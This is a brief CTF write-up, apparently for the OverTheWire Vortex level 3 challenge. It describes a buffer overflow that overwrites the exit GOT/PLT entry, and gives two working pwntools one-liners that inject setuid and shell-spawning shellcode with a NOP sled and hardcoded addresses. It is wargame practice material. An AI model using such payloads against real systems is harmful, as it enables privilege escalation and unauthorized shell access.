#stackoverflow #canary #got #plt
#Overwrite the GOT plt of exit with our shellcode address (shellcode should be placed into buff)

#First fill up the 128 byte buffer with our shellcode then place the address of the stack where the return address is with the address of the location of the _exit(can be found in the .got plt) which will be overwritten then with our shellcode address.

#### LOCAL machine ####
./vortex3 `python2 -c "from pwn import *; print '\x90' * (128-55) + asm(shellcraft.setuid(5004)) + asm(shellcraft.sh()) + '\x6c\xd6\xff\xff' + '\x22\x83\x04\x08'"`
#### REMOTE MACHINE OTC ###
/vortex/vortex3 `python2 -c "from pwn import *; print '\x90' * (128-55) + asm(shellcraft.setuid(5004)) + asm(shellcraft.sh()) + '\x6c\xd6\xff\xff' + '\x12\x83\x04\x08'"`
